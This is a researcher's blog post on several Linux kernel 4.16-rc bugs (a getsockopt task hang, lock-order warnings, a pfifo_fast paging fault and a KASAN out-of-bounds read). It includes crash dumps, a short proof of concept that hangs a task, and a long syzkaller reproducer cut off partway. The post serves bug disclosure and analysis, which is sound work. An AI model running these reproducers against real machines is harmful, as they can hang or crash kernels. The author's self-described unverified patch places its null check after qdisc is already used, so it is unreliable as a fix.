---
title: Linux Kernel - 2018-02 Founds
date: 2018-02-14
update: 2018-02-24
tags:
  - Security
  - Linux-Kernel
keywords:
  - 0-day
  - Bug
---

## getsockopt - task hung in lock_sock_nested

Posting in a long time :) because of other stuff. I have a few LK bugs but skip it :).

I just found a bug, task hung in lock_sock_nested on the latest LK (v4.16.0-rc1). Of course, from the conclusion, it's not a critical and meaningless bug for me :(.
So I just added a short PoC that can reproduce a bug and Call Trace.

### Call Trace (Dump)

Here's a Call Trace. task hung (default 120s).

```c
root@zer0day:~# uname -a
Linux zer0day 4.16.0-rc1+ #14 SMP Wed Feb 14 17:44:19 KST 2018 x86_64 GNU/Linux
root@zer0day:~# gcc -o poc poc.c
root@zer0day:~# ./poc
[  369.631452] INFO: task poc:2481 blocked for more than 120 seconds.
[  369.633340]       Not tainted 4.16.0-rc1+ #14
[  369.634552] "echo 0 > /proc/sys/kernel/hung_task_timeout_secs" disables this message.
[  369.636478] poc             D13984  2481   2464 0x00000000
[  369.638015] Call Trace:
[  369.638825]  ? __schedule+0x2a9/0xa90
[  369.639792]  ? __local_bh_enable_ip+0x7b/0xe0
[  369.640823]  schedule+0x2a/0x80
[  369.641559]  __lock_sock+0xa1/0x130
[  369.642395]  ? finish_wait+0x80/0x80
[  369.643189]  lock_sock_nested+0x9f/0xb0
[  369.643383]  ipv6_getorigdst+0x9e/0x2c0
[  369.643572]  ? __mutex_unlock_slowpath+0x46/0x2b0
[  369.643811]  ? nf_getsockopt+0x47/0x80
[  369.643996]  nf_getsockopt+0x47/0x80
[  369.644185]  ipv6_getsockopt+0x10a/0x170
[  369.644380]  udpv6_getsockopt+0x40/0x80
[  369.644569]  SyS_getsockopt+0x84/0xf0
[  369.644754]  do_syscall_64+0x74/0x210
[  369.644941]  entry_SYSCALL_64_after_hwframe+0x26/0x9b
[  369.645200] RIP: 0033:0x7f340483008a
[  369.645376] RSP: 002b:00007ffd08d09478 EFLAGS: 00000206 ORIG_RAX: 0000000000000037
[  369.645742] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f340483008a
[  369.646101] RDX: 0000000000000050 RSI: 0000000000000029 RDI: 0000000000000003
[  369.646443] RBP: 00007ffd08d09490 R08: 00007ffd08d09480 R09: 00007f3404aec2e0
[  369.646785] R10: 0000000000000000 R11: 0000000000000206 R12: 0000000000400450
[  369.647148] R13: 00007ffd08d09570 R14: 0000000000000000 R15: 0000000000000000
[  369.647499] 
[  369.647499] Showing all locks held in the system:
[  369.647802] 1 lock held by khungtaskd/439:
[  369.648026]  #0:  (tasklist_lock){.+.+}, at: [<00000000d02fdb21>] debug_show_all_locks+0x37/0x1a0
[  369.648470] 1 lock held by rsyslogd/2361:
[  369.648687]  #0:  (&f->f_pos_lock){+.+.}, at: [<0000000066b64151>] __fdget_pos+0x52/0x60
[  369.649092] 2 locks held by getty/2444:
[  369.649279]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.649714]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.650156] 2 locks held by getty/2445:
[  369.650343]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.650762]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.651203] 2 locks held by getty/2446:
[  369.651390]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.651813]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.652256] 2 locks held by getty/2447:
[  369.652443]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.652864]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.653305] 2 locks held by getty/2448:
[  369.653492]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.653915]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.654356] 2 locks held by getty/2449:
[  369.654542]  #0:  (&tty->ldisc_sem){++++}, at: [<000000004c37478c>] tty_ldisc_ref_wait+0x20/0x50
[  369.654961]  #1:  (&ldata->atomic_read_lock){+.+.}, at: [<00000000e92c7245>] n_tty_read+0xec/0xa60
[  369.655424] 1 lock held by poc/2481:
[  369.655599]  #0:  (sk_lock-AF_INET6){+.+.}, at: [<000000002374a639>] ipv6_getsockopt+0xf2/0x170
[  369.656030] 
[  369.656108] =============================================
[  369.656108]
```

### Bug

With the above Call Trace, I can notice, there is a lock_sock_nested in ipv6_getorigdst where the bug happened. 
At **/net/ipv6/netfilter/nf_conntrack_l3proto_ipv6.c:233**,

```c
...
static int
ipv6_getorigdst(struct sock *sk, int optval, void __user *user, int *len)
{
	struct nf_conntrack_tuple tuple = { .src.l3num = NFPROTO_IPV6 };
	const struct ipv6_pinfo *inet6 = inet6_sk(sk);
	const struct inet_sock *inet = inet_sk(sk);
	const struct nf_conntrack_tuple_hash *h;
	struct sockaddr_in6 sin6;
	struct nf_conn *ct;
	__be32 flow_label;
	int bound_dev_if;

	lock_sock(sk);
	tuple.src.u3.in6 = sk->sk_v6_rcv_saddr;
	tuple.src.u.tcp.port = inet->inet_sport;
	tuple.dst.u3.in6 = sk->sk_v6_daddr;
	tuple.dst.u.tcp.port = inet->inet_dport;
	tuple.dst.protonum = sk->sk_protocol;
	bound_dev_if = sk->sk_bound_dev_if;
	flow_label = inet6->flow_label;
	release_sock(sk);
	...
```

As you also know, **lock_sock_nested** looks like below. (*subclass* is zero in this case))

```c
void lock_sock_nested(struct sock *sk, int subclass)
{
	might_sleep(); // debug message is printed by this.
	spin_lock_bh(&sk->sk_lock.slock);
	if (sk->sk_lock.owned)
		__lock_sock(sk);
	sk->sk_lock.owned = 1;
	spin_unlock(&sk->sk_lock.slock);
	/*
	 * The sk_lock has mutex_lock() semantics here:
	 */
	mutex_acquire(&sk->sk_lock.dep_map, subclass, 0, _RET_IP_);
	local_bh_enable();
}
```

In short, maybe, there is a task hung in ipv6_getorigdst while holding the socket lock, so it's blocking other tasks too.

### POC

Here's a PoC code for reproducing.

```c
#define _GNU_SOURCE 

#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>

int main() {
	int size = 4;
	void *p = (void *)0;

	int s = socket(0xa, 2, 0);           // socket@inet6_udp
	getsockopt(s, 0x29, 0x50, p, &size); // getsockopt@inet6_int

	return 0;
}
```

## fifo_open - possible circular locking (leading to deadlock)

### Call Trace (Dump)

```c
WARNING: possible circular locking dependency detected
4.16.0-rc1+ #15 Not tainted
------------------------------------------------------
syz-executor4/30664 is trying to acquire lock:
 (&pipe->mutex/1){+.+.}, at: [<00000000c69506f3>] __pipe_lock fs/pipe.c:83 [inline]
 (&pipe->mutex/1){+.+.}, at: [<00000000c69506f3>] fifo_open+0x77/0x3c0 fs/pipe.c:921

but task is already holding lock:
 (&sig->cred_guard_mutex){+.+.}, at: [<00000000a7717ddc>] prepare_bprm_creds+0x2a/0x80 fs/exec.c:1389

which lock already depends on the new lock.


the existing dependency chain (in reverse order) is:

-> #2 (&sig->cred_guard_mutex){+.+.}:
       lock_trace+0x1f/0x70 fs/proc/base.c:408
       proc_pid_stack+0x73/0x120 fs/proc/base.c:444
       proc_single_show+0x4d/0x80 fs/proc/base.c:747
       seq_read+0x10f/0x560 fs/seq_file.c:237
       __vfs_read+0x50/0x1d0 fs/read_write.c:411
       vfs_read+0xc0/0x1a0 fs/read_write.c:447
       SYSC_read fs/read_write.c:573 [inline]
       SyS_read+0x60/0xe0 fs/read_write.c:566
       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287
       entry_SYSCALL_64_after_hwframe+0x26/0x9b

-> #1 (&p->lock){+.+.}:
       seq_read+0x51/0x560 fs/seq_file.c:165
       do_loop_readv_writev fs/read_write.c:673 [inline]
       do_iter_read+0x19f/0x1f0 fs/read_write.c:897
       vfs_readv+0x96/0xe0 fs/read_write.c:959
       kernel_readv fs/splice.c:361 [inline]
       default_file_splice_read+0x241/0x3e0 fs/splice.c:416
       do_splice_to+0x8c/0xc0 fs/splice.c:880
       do_splice fs/splice.c:1173 [inline]
       SYSC_splice fs/splice.c:1402 [inline]
       SyS_splice+0x7ba/0x820 fs/splice.c:1382
       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287
       entry_SYSCALL_64_after_hwframe+0x26/0x9b

-> #0 (&pipe->mutex/1){+.+.}:
       __mutex_lock_common kernel/locking/mutex.c:756 [inline]
       __mutex_lock+0x7a/0x9f0 kernel/locking/mutex.c:893
       __pipe_lock fs/pipe.c:83 [inline]
       fifo_open+0x77/0x3c0 fs/pipe.c:921
       do_dentry_open+0x276/0x400 fs/open.c:752
       vfs_open+0x5d/0xb0 fs/open.c:866
       do_last fs/namei.c:3378 [inline]
       path_openat+0x25b/0x1040 fs/namei.c:3518
       do_filp_open+0xb9/0x150 fs/namei.c:3553
       do_open_execat+0xa6/0x200 fs/exec.c:849
       do_execveat_common.isra.32+0x33d/0xbb0 fs/exec.c:1740
       do_execve fs/exec.c:1847 [inline]
       SYSC_execve fs/exec.c:1928 [inline]
       SyS_execve+0x34/0x40 fs/exec.c:1923
       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287
       entry_SYSCALL_64_after_hwframe+0x26/0x9b

other info that might help us debug this:

Chain exists of:
  &pipe->mutex/1 --> &p->lock --> &sig->cred_guard_mutex

 Possible unsafe locking scenario:

       CPU0                    CPU1
       ----                    ----
  lock(&sig->cred_guard_mutex);
                               lock(&p->lock);
                               lock(&sig->cred_guard_mutex);
  lock(&pipe->mutex/1);

 *** DEADLOCK ***
```

Skip the Call Trace (Stack backtrace).

## seq_read - possible circular locking (leading to deadlock)

### Call Trace (Dump)

```c
WARNING: possible circular locking dependency detected
4.16.0-rc1+ #15 Not tainted
------------------------------------------------------
syz-executor2/10621 is trying to acquire lock:
 (&p->lock){+.+.}, at: [<00000000dad12130>] seq_read+0x51/0x560 fs/seq_file.c:165

but task is already holding lock:
 (&pipe->mutex/1){+.+.}, at: [<000000009e27b116>] pipe_lock_nested fs/pipe.c:62 [inline]
 (&pipe->mutex/1){+.+.}, at: [<000000009e27b116>] pipe_lock+0x25/0x30 fs/pipe.c:70

which lock already depends on the new lock.


the existing dependency chain (in reverse order) is:

-> #2 (&pipe->mutex/1){+.+.}:
       __pipe_lock fs/pipe.c:83 [inline]
       fifo_open+0x77/0x3c0 fs/pipe.c:921
       do_dentry_open+0x276/0x400 fs/open.c:752
       vfs_open+0x5d/0xb0 fs/open.c:866
       do_last fs/namei.c:3378 [inline]
       path_openat+0x25b/0x1040 fs/namei.c:3518
       do_filp_open+0xb9/0x150 fs/namei.c:3553
       do_open_execat+0xa6/0x200 fs/exec.c:849
       do_execveat_common.isra.32+0x33d/0xbb0 fs/exec.c:1740
       do_execve fs/exec.c:1847 [inline]
       SYSC_execve fs/exec.c:1928 [inline]
       SyS_execve+0x34/0x40 fs/exec.c:1923
       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287
       entry_SYSCALL_64_after_hwframe+0x26/0x9b

-> #1 (&sig->cred_guard_mutex){+.+.}:
       lock_trace+0x1f/0x70 fs/proc/base.c:408
       proc_pid_stack+0x73/0x120 fs/proc/base.c:444
       proc_single_show+0x4d/0x80 fs/proc/base.c:747
       seq_read+0x10f/0x560 fs/seq_file.c:237
       __vfs_read+0x50/0x1d0 fs/read_write.c:411
       vfs_read+0xc0/0x1a0 fs/read_write.c:447
       SYSC_read fs/read_write.c:573 [inline]
       SyS_read+0x60/0xe0 fs/read_write.c:566
       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287
       entry_SYSCALL_64_after_hwframe+0x26/0x9b

-> #0 (&p->lock){+.+.}:
       __mutex_lock_common kernel/locking/mutex.c:756 [inline]
       __mutex_lock+0x7a/0x9f0 kernel/locking/mutex.c:893
       seq_read+0x51/0x560 fs/seq_file.c:165
       proc_reg_read+0x65/0xc0 fs/proc/inode.c:218
       do_loop_readv_writev fs/read_write.c:673 [inline]
       do_iter_read+0x19f/0x1f0 fs/read_write.c:897
       vfs_readv+0x96/0xe0 fs/read_write.c:959
       kernel_readv fs/splice.c:361 [inline]
       default_file_splice_read+0x241/0x3e0 fs/splice.c:416
       do_splice_to+0x8c/0xc0 fs/splice.c:880
       do_splice fs/splice.c:1173 [inline]
       SYSC_splice fs/splice.c:1402 [inline]
       SyS_splice+0x7ba/0x820 fs/splice.c:1382
       do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287
       entry_SYSCALL_64_after_hwframe+0x26/0x9b

other info that might help us debug this:

Chain exists of:
  &p->lock --> &sig->cred_guard_mutex --> &pipe->mutex/1

 Possible unsafe locking scenario:

       CPU0                    CPU1
       ----                    ----
  lock(&pipe->mutex/1);
                               lock(&sig->cred_guard_mutex);
                               lock(&pipe->mutex/1);
  lock(&p->lock);

 *** DEADLOCK ***
```

Skip the Call Trace (Stack backtrace).

## pfifo_fast_enqueue - unable to handle kernel paging request

I just got this bug from syzkaller today on LK v4.16.0-rc1.

### Call Trace (Dump)

```c
IP: qdisc_qstats_cpu_qlen_inc include/net/sch_generic.h:717 [inline]
IP: pfifo_fast_enqueue+0xce/0x130 net/sched/sch_generic.c:638
PGD 5f758067 P4D 5f758067 PUD 5f759067 PMD 7fa34067 PTE 800000003a9f7060
Oops: 0000 [#1] SMP DEBUG_PAGEALLOC PTI
Dumping ftrace buffer:
   (ftrace buffer empty)
Modules linked in:
CPU: 0 PID: 2766 Comm: syz-fuzzer Not tainted 4.16.0-rc1+ #17
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014
RIP: 0010:qdisc_qstats_cpu_qlen_inc include/net/sch_generic.h:717 [inline]
RIP: 0010:pfifo_fast_enqueue+0xce/0x130 net/sched/sch_generic.c:638
RSP: 0018:ffffb1ffc13df8e8 EFLAGS: 00010207
RAX: 0000472b4040eaa4 RBX: 0000000000000000 RCX: ffffffff8af3a141
RDX: 0000000000000000 RSI: 0000000000000005 RDI: ffff8ad479d17b08
RBP: ffff8ad479d178c0 R08: 0000000000000000 R09: 0000000000000000
R10: ffffb1ffc13df868 R11: 5aaeccbc2ff5acd1 R12: ffff8ad479d17800
R13: ffff8ad43a9f7f00 R14: ffff8ad479d17b08 R15: ffffb1ffc13df958
FS:  00007ff075d99700(0000) GS:ffff8ad43fc00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: ffff8ad43a9f7f28 CR3: 000000007a882000 CR4: 00000000000006f0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
 __dev_xmit_skb net/core/dev.c:3209 [inline]
 __dev_queue_xmit+0x331/0xd80 net/core/dev.c:3510
 neigh_hh_output include/net/neighbour.h:472 [inline]
 neigh_output include/net/neighbour.h:480 [inline]
 ip_finish_output2+0x5d8/0x7d0 net/ipv4/ip_output.c:229
 ip_finish_output+0x246/0x3d0 net/ipv4/ip_output.c:317
 NF_HOOK_COND include/linux/netfilter.h:277 [inline]
 ip_output+0x8a/0x2e0 net/ipv4/ip_output.c:405
 dst_output include/net/dst.h:443 [inline]
 ip_local_out+0x4e/0xa0 net/ipv4/ip_output.c:124
 ip_queue_xmit+0x289/0x760 net/ipv4/ip_output.c:504
 tcp_transmit_skb+0x645/0xd60 net/ipv4/tcp_output.c:1176
 tcp_send_ack.part.42+0xd4/0x160 net/ipv4/tcp_output.c:3619
 tcp_send_ack+0x1e/0x30 net/ipv4/tcp_output.c:3589
 tcp_cleanup_rbuf+0x88/0x180 net/ipv4/tcp.c:1605
 tcp_recvmsg+0x45c/0xf00 net/ipv4/tcp.c:2022
 inet_recvmsg+0x78/0x270 net/ipv4/af_inet.c:796
 sock_recvmsg_nosec net/socket.c:803 [inline]
 sock_recvmsg+0x47/0x60 net/socket.c:810
 sock_read_iter+0xb2/0x120 net/socket.c:887
 call_read_iter include/linux/fs.h:1775 [inline]
 new_sync_read fs/read_write.c:401 [inline]
 __vfs_read+0x169/0x1d0 fs/read_write.c:413
 vfs_read+0xc0/0x1a0 fs/read_write.c:447
 SYSC_read fs/read_write.c:573 [inline]
 SyS_read+0x60/0xe0 fs/read_write.c:566
 do_syscall_64+0x74/0x210 arch/x86/entry/common.c:287
 entry_SYSCALL_64_after_hwframe+0x26/0x9b
RIP: 0033:0x488864
RSP: 002b:000000c4204a99a8 EFLAGS: 00000246 ORIG_RAX: 0000000000000000
RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000488864
RDX: 0000000000001000 RSI: 000000c4203c1000 RDI: 0000000000000003
RBP: 000000c4204a99f8 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 000000c425859aa0
R13: 0000000000000001 R14: 000000c42449b260 R15: 0000000000000000
Code: 00 00 39 83 40 02 00 00 7d 67 e8 7e 48 63 ff 4c 89 f7 e8 46 2f 37 00 31 db e8 6f 48 63 ff 49 8b 44 24 58 65 ff 00 49 8b 44 24 58 <41> 8b 55 28 65 01 50 04 e8 55 48 63 ff 89 d8 5b 5d 41 5c 41 5d 
RIP: qdisc_qstats_cpu_qlen_inc include/net/sch_generic.h:717 [inline] RSP: ffffb1ffc13df8e8
RIP: pfifo_fast_enqueue+0xce/0x130 net/sched/sch_generic.c:638 RSP: ffffb1ffc13df8e8
CR2: ffff8ad43a9f7f28
---[ end trace a3bf459ad1c9376d ]---
```

RIP is pointing at pfifo_fast_enqueue.

### Bug

```c
static int pfifo_fast_enqueue(struct sk_buff *skb, struct Qdisc *qdisc,
			      struct sk_buff **to_free)
{
	int band = prio2band[skb->priority & TC_PRIO_MAX];
	struct pfifo_fast_priv *priv = qdisc_priv(qdisc);
	struct skb_array *q = band2list(priv, band);
	int err;

	err = skb_array_produce(q, skb);

	if (unlikely(err))
		return qdisc_drop_cpu(skb, qdisc, to_free);

	qdisc_qstats_cpu_qlen_inc(qdisc);
	qdisc_qstats_cpu_backlog_inc(qdisc, skb);
	return NET_XMIT_SUCCESS;
}

static inline void qdisc_qstats_cpu_qlen_inc(struct Qdisc *sch)
{
	this_cpu_inc(sch->cpu_qstats->qlen); // equals to this_cpu_add(sch->cpu_qstats->qlen, 1);
}

static inline void qdisc_qstats_cpu_backlog_inc(struct Qdisc *sch,
						const struct sk_buff *skb)
{
	this_cpu_add(sch->cpu_qstats->backlog, qdisc_pkt_len(skb));
}

```

```c
   0:   00 00                   add    BYTE PTR [rax],al
   2:   39 83 40 02 00 00       cmp    DWORD PTR [rbx+0x240],eax ; unlikely(err)
   8:   7d 67                   jge    0x71 ; maybe errout
   a:   e8 7e 48 63 ff          call   0xffffffffff63488d ; this_cpu_add
   f:   4c 89 f7                mov    rdi,r14
  12:   e8 46 2f 37 00          call   0x372f5d
  17:   31 db                   xor    ebx,ebx ; ebx = 0
  19:   e8 6f 48 63 ff          call   0xffffffffff63488d ; this_cpu_add
  1e:   49 8b 44 24 58          mov    rax,QWORD PTR [r12+0x58]
  23:   65 ff 00                inc    DWORD PTR gs:[rax] ; sch->cpu_qstats->qlen, increased by 1
  26:   49 8b 44 24 58          mov    rax,QWORD PTR [r12+0x58] ; qdisc
  2b:  *41 8b 55 28             mov    edx,DWORD PTR [r13+0x28] ; skb
  2f:   65 01 50 04             add    DWORD PTR gs:[rax+0x4],edx
  33:   e8 55 48 63 ff          call   0xffffffffff63488d ; this_cpu_add
  38:   89 d8                   mov    eax,ebx ; eax = ebx (eax = 0)
  3a:   5b                      pop    rbx
  3b:   5d                      pop    rbp
  3c:   41 5c                   pop    r12
  3e:   41 5d                   pop    r13
```

Generously, 'Unable to handle kernel paging request' bug happened when bad type-casting or invalid pointer exist.

At 0x2b, there is a crash point. Meaning that accessing [r13+0x28] is violated.  Let's have a look.

With above Crash Dump, we can notice **r13** is 0x1. At result, in that case, accessing at 0x29 where a invalid page is currently, getting value from there and moving into edx (skb).

So the bug is happened by above reason.

Then, why 'r13' is corrupted? Well... digging up more with reproducible PoC and then maybe there's a clear result :).

### Solution

Maybe, more strict pointer validation is needed at qdisc & skb. Here's my suggested patch PoC code. (not verified).

```c
static int pfifo_fast_enqueue(struct sk_buff *skb, struct Qdisc *qdisc,
			      struct sk_buff **to_free)
{
	int band = prio2band[skb->priority & TC_PRIO_MAX];
	struct pfifo_fast_priv *priv = qdisc_priv(qdisc);
	struct skb_array *q = band2list(priv, band);
	int err;

	err = skb_array_produce(q, skb);

	if (unlikely(err))
		return qdisc_drop_cpu(skb, qdisc, to_free);
		
	if (!qdisc) // qdisc validation
	    return sth;
	
	qdisc_qstats_cpu_qlen_inc(qdisc);
	qdisc_qstats_cpu_backlog_inc(qdisc, skb);
	return NET_XMIT_SUCCESS;
}
```

## tick_sched_time/handle - alloca Out Of Bounds

Got from syzkaller & Found in LK v4.16.0-rc2~.

### Call Trace (Dump)

```c
BUG: KASAN: alloca-out-of-bounds in tick_sched_handle+0x165/0x180
Read of size 8 at addr ffff880022ba7030 by task syz-executor5/3160

CPU: 0 PID: 3160 Comm: syz-executor5 Not tainted 4.16.0-rc2+ #2
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
Call Trace:
 <IRQ>
 dump_stack+0x127/0x213
 print_address_description+0x60/0x22b
 kasan_report.cold.6+0xac/0x2f4
 </IRQ>

The buggy address belongs to the page:
page:ffffea00008ae9c0 count:0 mapcount:0 mapping:          (null) index:0x0
flags: 0x100000000000000()
raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff
raw: 0000000000000000 ffffea00008ae9e0 0000000000000000 0000000000000000
page dumped because: kasan: bad access detected

Memory state around the buggy address:
 ffff880022ba6f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 ffff880022ba6f80: 00 00 00 00 00 00 00 00 00 00 00 00 ca ca ca ca
>ffff880022ba7000: 02 cb cb cb cb cb cb cb 00 00 00 00 00 00 00 00
                                     ^
 ffff880022ba7080: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1
 ffff880022ba7100: f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00 f2 f2 f2 f2
==================================================================
Kernel panic - not syncing: panic_on_warn set ...

CPU: 0 PID: 3160 Comm: syz-executor5 Tainted: G    B            4.16.0-rc2+ #2
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
Call Trace:
 <IRQ>
 dump_stack+0x127/0x213
 panic+0x1f8/0x46f
 kasan_end_report+0x43/0x49
 kasan_report.cold.6+0xc8/0x2f4
 </IRQ>
Dumping ftrace buffer:
   (ftrace buffer empty)
Kernel Offset: 0x8e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
Rebooting in 86400 seconds..
2018/02/24 05:33:21 reproducing crash 'KASAN: alloca-out-of-bounds Read in tick_sched_handle': final repro crashed as (corrupted=false):
==================================================================
BUG: KASAN: alloca-out-of-bounds in tick_sched_handle+0x165/0x180
Read of size 8 at addr ffff880022ba7030 by task syz-executor5/3160

CPU: 0 PID: 3160 Comm: syz-executor5 Not tainted 4.16.0-rc2+ #2
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
Call Trace:
 <IRQ>
 dump_stack+0x127/0x213
 print_address_description+0x60/0x22b
 kasan_report.cold.6+0xac/0x2f4
 </IRQ>

The buggy address belongs to the page:
page:ffffea00008ae9c0 count:0 mapcount:0 mapping:          (null) index:0x0
flags: 0x100000000000000()
raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff
raw: 0000000000000000 ffffea00008ae9e0 0000000000000000 0000000000000000
page dumped because: kasan: bad access detected

Memory state around the buggy address:
 ffff880022ba6f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 ffff880022ba6f80: 00 00 00 00 00 00 00 00 00 00 00 00 ca ca ca ca
>ffff880022ba7000: 02 cb cb cb cb cb cb cb 00 00 00 00 00 00 00 00
                                     ^
 ffff880022ba7080: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1
 ffff880022ba7100: f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00 f2 f2 f2 f2
==================================================================
Kernel panic - not syncing: panic_on_warn set ...

CPU: 0 PID: 3160 Comm: syz-executor5 Tainted: G    B            4.16.0-rc2+ #2
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
Call Trace:
 <IRQ>
 dump_stack+0x127/0x213
 panic+0x1f8/0x46f
 kasan_end_report+0x43/0x49
 kasan_report.cold.6+0xc8/0x2f4
 </IRQ>
Dumping ftrace buffer:
   (ftrace buffer empty)
Kernel Offset: 0x8e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
Rebooting in 86400 seconds..
```

### PoC

generated by syz-repro.

```c
#define _GNU_SOURCE

#include <endian.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <sys/mount.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_tun.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <net/if_arp.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <linux/net.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

__attribute__((noreturn)) static void doexit(int status)
{
	volatile unsigned i;
	syscall(__NR_exit_group, status);
	for (i = 0;; i++) {
	}
}
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

const int kFailStatus = 67;
const int kRetryStatus = 69;

  static void fail(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);
}

  static void exitf(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit(kRetryStatus);
}

static uint64_t current_time_ms()
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts))
		fail("clock_gettime failed");
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static void use_temporary_dir()
{
	char tmpdir_template[] = "./syzkaller.XXXXXX";
	char* tmpdir = mkdtemp(tmpdir_template);
	if (!tmpdir)
		fail("failed to mkdtemp");
	if (chmod(tmpdir, 0777))
		fail("failed to chmod");
	if (chdir(tmpdir))
		fail("failed to chdir");
}

static void vsnprintf_check(char* str, size_t size, const char* format, va_list args)
{
	int rv;

	rv = vsnprintf(str, size, format, args);
	if (rv < 0)
		fail("tun: snprintf failed");
	if ((size_t)rv >= size)
		fail("tun: string '%s...' doesn't fit into buffer", str);
}

static void snprintf_check(char* str, size_t size, const char* format, ...)
{
	va_list args;

	va_start(args, format);
	vsnprintf_check(str, size, format, args);
	va_end(args);
}

#define COMMAND_MAX_LEN 128
#define PATH_PREFIX "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin "
#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)

static void execute_command(bool panic, const char* format, ...)
{
	va_list args;
	char command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];
	int rv;

	va_start(args, format);
	memcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);
	vsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);
	rv = system(command);
	if (panic && rv != 0)
		fail("tun: command \"%s\" failed with code %d", &command[0], rv);

	va_end(args);
}

static int tunfd = -1;
static int tun_frags_enabled;

#define SYZ_TUN_MAX_PACKET_SIZE 1000

#define TUN_IFACE "syz_tun"

#define LOCAL_MAC "aa:aa:aa:aa:aa:aa"
#define REMOTE_MAC "aa:aa:aa:aa:aa:bb"

#define LOCAL_IPV4 "172.20.20.170"
#define REMOTE_IPV4 "172.20.20.187"

#define LOCAL_IPV6 "fe80::aa"
#define REMOTE_IPV6 "fe80::bb"

#define IFF_NAPI 0x0010
#define IFF_NAPI_FRAGS 0x0020

static void initialize_tun(void)
{
	tunfd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
	if (tunfd == -1) {
		printf("tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\n");
		printf("otherwise fuzzing or reproducing might not work as intended\n");
		return;
	}
	const int kTunFd = 252;
	if (dup2(tunfd, kTunFd) < 0)
		fail("dup2(tunfd, kTunFd) failed");
	close(tunfd);
	tunfd = kTunFd;

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);
